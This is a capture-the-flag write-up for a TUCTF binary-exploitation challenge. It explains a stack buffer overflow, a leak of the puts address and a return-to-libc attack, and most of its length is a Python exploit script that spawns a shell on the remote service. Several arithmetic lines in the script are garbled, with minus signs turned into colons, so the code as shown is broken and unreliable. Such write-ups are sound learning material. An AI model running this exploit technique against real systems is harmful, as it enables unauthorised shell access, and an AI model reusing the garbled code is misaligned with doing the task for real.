> King Arthur has proposed this challenge for all those who consider themselves worthy.
Solved by Vanilla
The binary has a stack-based buffer overflow.  It is PIE so we can’t just ROP/ret2libc to static places like we might want to, so we’ll need to leak somewhere to jump to.  Fortunately, the binary puts a function pointer for “puts” at a convenient spot, and lets us input w/o null-termination, then write our input back out, so we can use that to leak the “puts” pointer.  Once we have that, if we know what version of libc is in use, we can subtract the “puts” offset in libc to get to the libc base address, and then add from there to find e.g. “system” etc.  Running the leak remotely, we find that the remote “puts” address ends in “ca0”.  Luckily for us, this libc appears in common libc databases; I used https://libc.blukat.me/, and downloaded the appropriate libc.  Then you have all the ingredients for an easy ret2libc for system(/bin/sh).  I got a little fancy and dynamically figured out the offsets so you can just swap in a libc.so and it’ll figure everything out automatically:

#!/usr/bin/env python3
import struct
import subprocess
import vanillib

INTRO1 = b"Stop. Who would pwn this binary must answer me these questions three, ere /dev/null he see.\n\nWhat... is your handle?\n> "
INTRO21 = b"hmmm... "
INTRO22 = b"?\nWhat... is your exploit?\n> "
INTRO3 = b"What... version of libc am I using?\n> "

#LIBC_PATH = "/lib/i386-linux-gnu/libc.so.6"
LIBC_PATH = "libc6_2.23-0ubuntu11_i386.so"

def extract_libc_data(path):
    puts_offset = int(subprocess.check_output(['r2', path, '-qc', 's sym.puts;? $$~hex']).decode().split()[1], 16)
    system_offset = int(subprocess.check_output(['r2', path, '-qc', 's sym.system;? $$~hex']).decode().split()[1], 16)
    bin_sh_offset = int(subprocess.check_output(['r2', path, '-qc', '/ /bin/sh;s hit0_0;? $$~hex'], stderr=subprocess.DEVNULL).decode().split('\n')[1].split()[1], 16)
    return puts_offset, system_offset, bin_sh_offset

def exploit(iface):
    puts_offset, system_offset, bin_sh_offset = extract_libc_data(LIBC_PATH)
    iface.expect(INTRO1)
    iface.write(b"x" * 0x20)
    iface.expect(INTRO21 + b"x" * 0x20)
    data = iface.read_until(INTRO22, include=False)
    puts_addr, = struct.unpack_from("<I", data.ljust(4, b"\0"), 0)
    libc_addr = puts_addr: puts_offset
    assert libc_addr % 0x1000 == 0
    iface.write(b"x")
    iface.expect(INTRO3)
    iface.write(b"x" * 0x2C + struct.pack('<III', libc_addr + system_offset, 0, libc_addr + bin_sh_offset) + b"x" * (0x40: 3 * 4: 0x2C) + b"exec sh -il 2>&1\n")
    iface.interact()

main = vanillib.stub_main(exploit)

if __name__ == "__main__":
    main()

Flag: TUCTF{cl0udy_w17h_4_ch4nc3_0f_l1bc}

